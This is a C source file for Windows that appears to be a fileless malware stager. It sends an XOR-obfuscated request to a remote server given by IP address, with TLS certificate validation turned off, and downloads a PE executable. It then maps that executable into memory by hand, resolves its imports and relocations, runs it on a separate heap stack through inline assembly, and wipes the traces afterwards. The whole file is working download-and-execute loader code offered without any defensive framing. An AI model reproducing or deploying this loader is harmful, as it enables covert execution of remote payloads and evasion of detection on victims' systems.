

#include <stdio.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <winhttp.h>
#include <Windows.h>
#include <VersionHelpers.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Winhttp.lib")

#define DEREF_DWORD( name )*(DWORD *)(name)

typedef struct IMAGE_BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} IMAGE_BASE_RELOCATION_ENTRY, *PIMAGE_BASE_RELOCATION_ENTRY;


typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOEXW);

BOOL Calculate(char* request, DWORD size);
BYTE* GetDataHttps(DWORD* data_size, wchar_t* ip);
DWORD* GetFlsIndexPtr(BOOL* peb_usage);



BOOL Calculate(char* request, DWORD size)
{

	unsigned int i;

	for (i = 0; i < 5; i++)
	{
		request[i] = request[i] ^ 7;
	}
	for (i = 5; i < size; i++)
	{
		request[i] = request[i] ^ 217;
	}
	for (i = 0; i < size; i++)
	{
		request[i] = request[i] ^ 156;
	}

	return TRUE;

}

BYTE* GetDataHttps(DWORD* data_size, wchar_t* ip)
{
	
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	DWORD flags;
	DWORD size_written;
	DWORD size_read;
	DWORD response_size = 0;
	DWORD dwArr[] = { 0x6C6C756E, 0x7265742D, 0x616E696D, 0x646574 };
	char* request = (char*)dwArr;
	Calculate(request, strlen(request));
	BOOL result = FALSE;
	BYTE* data = NULL;
	BYTE* temp_buf = NULL;
	unsigned int full_size = 0;

	INTERNET_PORT port = 443;
	wchar_t* user_agent = L"runinBrowser";
	wchar_t* url = L"/this/is/the/best";

	hSession = WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		hConnect = WinHttpConnect(hSession, ip, port, 0);
	}

	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect , L"POST", url, NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	}

	if (hRequest)
	{
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
		WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

		result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, (DWORD)strlen(request), 0);
	}

	if (result)
	{
		result = WinHttpWriteData(hRequest, request, (DWORD)strlen(request), &size_written);
	}

	if (result)
	{
		result = WinHttpReceiveResponse(hRequest, NULL);
	}

	if (result)
	{

		data = (BYTE*)malloc(response_size);

		WinHttpQueryDataAvailable(hRequest, &response_size);

		while (response_size > 0)
		{
			temp_buf = (BYTE*)malloc(response_size);
			ZeroMemory(temp_buf, response_size);

			result = WinHttpReadData(hRequest, temp_buf, response_size, &size_read);

			full_size += response_size;

			data = (BYTE*)realloc(data, full_size);

			// Add the data we got from the response to the complete buffer, at the correct index
			memcpy(data + (full_size - response_size), temp_buf, response_size);

			free(temp_buf);

			WinHttpQueryDataAvailable(hRequest, &response_size);
		}

	}
	
	WinHttpCloseHandle(hSession);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hRequest);
	*data_size = full_size;
	return data;
		

}

int CALLBACK WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     LPSTR lpCmdLine, int nCmdShow )
{
	
	int argc = 0;
	
	// argv[1] - the ip of the remote http server
	wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	if (argc < 2)
	{
		return 0;
	}
	
	PVOID mImage;
	BYTE* dImage;
	DWORD dImage_size;
	HINSTANCE lib_address;
	char* libname;
	DWORD entry_point;
	PIMAGE_NT_HEADERS nt;
	PIMAGE_SECTION_HEADER section;
	DWORD thunk;
	DWORD import_directory;
	DWORD import_directory_va;
	DWORD function;
	DWORD sizeOfImage;
	DWORD oldProtect;
	DWORD newProtect;

	//reloc variables
	DWORD delta;
	DWORD relocAddress;
	IMAGE_DATA_DIRECTORY relocData;
	PIMAGE_BASE_RELOCATION pRelocBlockHeader;
	DWORD offset = 0;
	DWORD relocEntryCount;
	DWORD newAddress;
	DWORD fieldAddress;

	// fiber variables
	BOOL peb_usage;
	DWORD* fiber_index;
	DWORD original_fls;
	DWORD current_fls;



	dImage = GetDataHttps(&dImage_size, argv[1]);
	
	if (dImage == NULL || dImage[0] != 'M' || dImage[1] != 'Z')
	{
		printf("Could Not Get Data\n");
		return 0;
	}

	// Reading the NT header of the file
	nt = (PIMAGE_NT_HEADERS)(dImage + ((PIMAGE_DOS_HEADER)dImage)->e_lfanew);

	sizeOfImage = nt->OptionalHeader.SizeOfImage;

	// Allocating memory for the Image as it should be in memory
	mImage = VirtualAlloc(
		NULL,
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);

	// Calculating the delta between the two image bases
	delta = (DWORD)mImage - nt->OptionalHeader.ImageBase;

	// Changing the base adderss to the new allocated region
	nt->OptionalHeader.ImageBase = (DWORD)mImage;

	// Calculating the address of teh Entry Point
	entry_point = nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint;
	

	if (mImage == 0)
	{
		//printf("VirtualAllocEx Failed, Error: 0x%x\n", GetLastError());
		//exit(0);
		return 0;
	}


	// Write headers on the allocated space
	memcpy(
		mImage,
		dImage,
		nt->OptionalHeader.SizeOfHeaders);



	
	// Write sections on the allocated space
	section = IMAGE_FIRST_SECTION(nt);
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{

		// Saving the .reloc section address for Reallocating addresses
		if (strcmp((char*)section[i].Name, ".reloc") == 0)
		{
			relocAddress = section[i].PointerToRawData;
		}
		memcpy(
			(BYTE*)mImage + section[i].VirtualAddress,
			dImage + section[i].PointerToRawData,
			section[i].SizeOfRawData);
	}


	// Reallocating the image addresses
	relocData = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	while (offset < relocData.Size)
	{
		pRelocBlockHeader = (PIMAGE_BASE_RELOCATION)(dImage + relocAddress + offset);
		offset += sizeof(IMAGE_BASE_RELOCATION);

		relocEntryCount = (pRelocBlockHeader->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_BASE_RELOCATION_ENTRY);
		PIMAGE_BASE_RELOCATION_ENTRY pRelocBlocks = (PIMAGE_BASE_RELOCATION_ENTRY)(dImage + relocAddress + offset);

		for (unsigned int i = 0; i < relocEntryCount; i++)
		{
			offset += sizeof(IMAGE_BASE_RELOCATION_ENTRY);
			if (pRelocBlocks[i].Type == 0)
			{
				continue;
			}

			fieldAddress = pRelocBlockHeader->VirtualAddress + pRelocBlocks[i].Offset;
			
			
			memcpy(&newAddress, ((BYTE*)mImage + fieldAddress), sizeof(DWORD));

			newAddress += delta;

			memcpy(((BYTE*)mImage + fieldAddress), &newAddress, sizeof(DWORD));
			
		}

	}
	



	// read import dirctory    
	import_directory = (DWORD) &(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

	// get the import directory virtual addresses 
	import_directory_va = (DWORD)(nt->OptionalHeader.ImageBase) +
		((PIMAGE_DATA_DIRECTORY)import_directory)->VirtualAddress;


	while (((PIMAGE_IMPORT_DESCRIPTOR)import_directory_va)->Name)
	{
		// get DLL name
		libname = (char*)(nt->OptionalHeader.ImageBase +
			((PIMAGE_IMPORT_DESCRIPTOR)import_directory_va)->Name);

		// Load dll
		lib_address = LoadLibrary(libname);

		// get first thunk, it will become our IAT
		thunk = nt->OptionalHeader.ImageBase +
			((PIMAGE_IMPORT_DESCRIPTOR)import_directory_va)->FirstThunk;

		// resolve function addresses
		while (DEREF_DWORD(thunk))
		{
			// Get the address of the struct IMAGE_IMPORT_BY_NAME, we will rewrite it with the function address
			function = nt->OptionalHeader.ImageBase + DEREF_DWORD(thunk);

			// Get function name 
			LPSTR Fname = (char*)((PIMAGE_IMPORT_BY_NAME)function)->Name;

			// Rewrite thunk to the pointer to the function
			DEREF_DWORD(thunk) = (DWORD)GetProcAddress(lib_address, Fname);
			thunk += 4;
		}

		import_directory_va += sizeof(IMAGE_IMPORT_DESCRIPTOR);

	}

	// change permissions of .text and .data sections
	section = IMAGE_FIRST_SECTION(nt);
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{

		if (strcmp((char*)section[i].Name, ".data") == 0)
		{
			newProtect = PAGE_READWRITE;
		}
		else if (strcmp((char*)section[i].Name, ".text") == 0)
		{
			newProtect = PAGE_EXECUTE_READ;
		}
		else if (strcmp((char*)section[i].Name, ".rdata") == 0 || strcmp((char*)section[i].Name, ".reloc") == 0 || strcmp((char*)section[i].Name, ".rsrc") == 0)
		{
			newProtect = PAGE_READONLY;
		}
		VirtualProtect((BYTE*)mImage + section[i].VirtualAddress, section[i].SizeOfRawData, newProtect, &oldProtect);
	}



	
	// Creating new stack for the child process on the heap
	int stack_size = 64 * 4096;

	void* esp_heap_boundry = (void*)malloc(stack_size);
	void* ebp_heap_boundry = (void*)((DWORD)esp_heap_boundry + stack_size);

	memset(esp_heap_boundry, 0, stack_size);

	void* esp_heap = (void*)((DWORD)esp_heap_boundry + 16 * 4096);
	void* ebp_heap = (void*)((DWORD)ebp_heap_boundry - 16 * 4096);

	fiber_index = GetFlsIndexPtr(&peb_usage);

	// Getting The Fiber Local Storage high index, before run
	original_fls = *fiber_index;

	// We want the original_fls value to point to the high index of the FLS,
	// So if we got it from the ntdll we got the total number of elements and not the high index,
	// So we decrease the value by one
	if (peb_usage == FALSE)
	{
		original_fls--;
	}
	
	__asm
	{
		// Saving all the registers values
		push eax
		push ebx
		push ecx
		push edx
		push esi
		push edi

		// Moving the Entry Point address to eax
		mov eax, entry_point

		// Changes the address of ebp and esp to the 'new' stack
		mov ecx, ebp
		mov edx, esp
		mov esp, esp_heap
		mov ebx, ebp_heap
		add ebx, 4
		mov ebp, ebx

		// Saves the real ebp and esp address on the 'new' stack
		push edx
		push ecx
		
		call eax
		
		// Restores stack
		pop ebp
		pop esp

		// Restore registers values
		pop edi
		pop esi
		pop edx
		pop ecx
		pop ebx
		pop eax
	}
	
	// Gets The Fiber Local Storage high index, after run
	current_fls = *fiber_index;

	// Decreasing the value by 1 if we got it from the ntdll
	if (peb_usage == FALSE)
	{
		current_fls--;
	}
	
	// Free all the Fibers Created by the child process
	for (unsigned int i = original_fls + 1; i <= current_fls; i++)
	{
		FlsFree(i);
	}

	// Increasing the value by 1 if we got it from the ntdll because,
	// We want to restore the value of the total elements and not the high index
	if (peb_usage == FALSE)
	{
		original_fls++;
	}
	
	// Rerstore the Fiber Local Storage index to the original index
	*fiber_index = original_fls;
	
	free(esp_heap_boundry);
	
	// Changing to the image page permissions to read write, to zero the data
	VirtualProtect(mImage, sizeOfImage, PAGE_READWRITE, &oldProtect);
	for (int i = 0; i < 14; i++)
	{
		SecureZeroMemory(mImage, sizeOfImage);
		SecureZeroMemory(dImage, dImage_size);
	}
	
	VirtualFree(mImage, 0, MEM_RELEASE);
	free(dImage);
	return 0;
} 


DWORD* GetFlsIndexPtr(BOOL* peb_usage)
{

	DWORD* fiber_index;
	HMODULE ntdll;

	RTL_OSVERSIONINFOEXW os = { 0 };
	os.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	
	ntdll = GetModuleHandleW(L"ntdll");

	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
	RtlGetVersion(&os);


	// Access the fiber index through ntdll
	if (os.dwMajorVersion == 10 && os.dwBuildNumber >= 18362)
	{
		/*
		* As of windows 10 2004 (or 1903) the member FlsHIghIndex was removed from the PEB structure.
		* So to get the number of FLS i reversed ntdll!RtlpFlsAlloc and saw that ntdll has a pointer
		* to a pointer to the heap in there exists a data sructure with FLS info, including the number of FLS.
		* The name of the struct is _RTLP_FLS_CONTEXT.
		*
		* Note that this value is differnt from the FlsHighIndex member
		* by one - because one is an index to the last element and one is the count of all elements.
		*
		* I saw in the code of ntdll!RtlpFlsAlloc that ntdll access this structure through an offset
		* And not by a function, so we will do the same here.
		*/

		//RtlpFlsContext = (void*)((DWORD)ntdll + 0x1266d4);
		//fiber_index = *((DWORD**)((DWORD)RtlpFlsContext + 4));
		fiber_index = *((DWORD**)((DWORD)ntdll + 0x1266d4));
		*peb_usage = FALSE;
	}
	
	// The code is executiong on windows prior to windows 10 1903
	else
	{

		// Getting the pointer in the PEB (32 bit) struct of FlsHighIndex
		fiber_index = (DWORD*)((BYTE*)__readfsdword(0x30) + 0x22c);
		*peb_usage = TRUE;
	}

	return fiber_index;
}